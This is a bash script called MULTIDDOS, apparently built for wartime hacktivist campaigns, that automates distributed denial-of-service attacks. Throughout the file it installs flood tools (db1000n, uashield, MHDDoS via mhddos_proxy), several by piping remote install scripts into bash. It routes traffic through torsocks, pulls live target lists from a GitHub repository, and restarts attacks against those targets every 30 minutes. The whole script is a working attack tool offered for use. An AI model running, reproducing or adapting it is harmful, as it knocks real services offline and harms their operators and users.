#!/bin/bash
# curl -L tiny.one/multiddos | bash && tmux a

cd ~
rm -rf multidd
mkdir multidd
cd multidd

gotop="on"
db1000n="on"
uashield="off"
vnstat="off"
matrix="off"
threads="-t 250"
methods="--http-methods GET STRESS"
#rpc="--rpc 2000"
#export debug="--debug"

launch () {
if [ ! -f "/usr/local/bin/gotop" ]; then
    curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
    sudo dpkg -i gotop.deb
fi

tmux kill-session -t multiddos; sudo pkill node; sudo pkill shield
# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf

if [[ $gotop == "on" ]]; then
    tmux new-session -s multiddos -d 'gotop -asc solarized'
    sleep 0.2
    tmux split-window -h -p 66 'bash auto_bash.sh'
else 
    if [[ $matrix == "on" ]]; then
        tmux new-session -s multiddos -d 'cmatrix'
        sleep 0.2
        tmux split-window -h -p 66 'bash auto_bash.sh'
    else
        sleep 0.2
        tmux new-session -s multiddos -d 'bash auto_bash.sh'
    fi
fi

if [[ $vnstat == "on" ]]; then
sleep 0.2
tmux split-window -v 'vnstat -l'
fi

if [[ $db1000n == "on" ]]; then
sleep 0.2
tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
fi
if [[ $uashield == "on" ]]; then
sleep 0.2
tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
fi
if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
sleep 0.2
tmux select-pane -t 0
sleep 0.2
tmux split-window -v 'cmatrix'
fi
#tmux -2 attach-session -d
}

usage () {
cat << EOF
usage: bash multiddos.sh [-d|-u|-t|-m|-h]
                            -d | --db1000n        - disable db1000n
                            -g | --gotop          - disable gotop
                            +u | --uashield       - enable uashield
                            -t | --threads        - threads; default = 1000
                            +m | --matrix         - enable matrix
                            +v | --vnstat         - enable vnstat -l (traffic monitoring)
                            -h | --help           - brings up this menu
EOF
exit
}

if [[ "$1" = ""  ]]; then launch; fi

while [ "$1" != "" ]; do
    case $1 in
        -d | --db1000n )   db1000n="off"; shift ;;
        +u | --uashield )   uashield="on"; shift ;;
        -t | --threads )   export threads="-t $2"; shift 2 ;;
        +m | --matrix )   matrix="on"; shift ;;
        -g | --gotop ) gotop="off"; db1000n="on"; shift ;;
        +v | --vnstat ) vnstat="on"; shift ;;
        -h | --help )    usage;   exit ;;
        *  )   usage;   exit ;;
    esac
done

# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo apt-get update -q -y
sudo apt-get install -q -y tmux vnstat toilet torsocks python3 python3-pip
pip install --upgrade pip

cat > auto_bash.sh << 'EOF'
# create swap file if system doesn't have it
if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
    sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
fi

#install mhddos and mhddos_proxy
cd ~/multidd/
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt
git clone https://github.com/MHProDev/MHDDoS.git

# Prepare targets file
file="/var/tmp/uaripper.targets"
file_tmp="/var/tmp/tmp.targets"

echo -n > $file
echo -n > $file_tmp

curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts -o $file_tmp

cat $file_tmp | while read LINE; do
    if [[ $LINE != "#"* ]]; then
        echo $LINE >> $file
    fi
done

echo -n > $file_tmp
for i in $(cat $file); do
    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
        echo $i >> $file_tmp
    fi
done

# print total targets, print uniq targets in config file
# echo -e "\ntotal secondary targets: " $(cat $file_tmp | wc -l)
cat $file_tmp | sort | uniq > $file
clear
sec_targets=$(cat $file | sort | uniq | wc -l)
main_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -w)
total_targets=$(expr $sec_targets + $main_targets)

toilet -t --metal Український
toilet -t --metal "  жнець"
toilet -t --metal MULTIDDOS
# toilet -t --metal Ukrainian
# toilet -t --metal "  ripper"
# toilet -t --metal MULTIDDOS
echo -e "\x1b[32m secondary targets:\x1b[m" $sec_targets
echo -e "\x1b[32m main targets:\x1b[m" $main_targets
echo -e "\x1b[32m total:\x1b[m" $total_targets
sleep 5

# Restart attacks and update targets every 30 minutes
while true; do
        pkill -f start.py; pkill -f runner.py 
        python3 ~/multidd/mhddos_proxy/runner.py -c $file $threads $rpc $methods&
        list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
         while [[ $list_size = "0"  ]]; do
            sleep 8
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
        done
        for (( i=1; i<=list_size; i++ )); do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads&
        done
sleep 30m
done

#old part backup
# while true; do
# pkill -f start.py; pkill -f runner.py 
#      # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
#     list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
#          while [[ $list_size = "0"  ]]; do
#             sleep 5
#             list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
#       done
#    for (( i=1; i<=list_size; i++ )); do
#             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
#             python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc&
#       done
# sleep 30m
# done
EOF

launch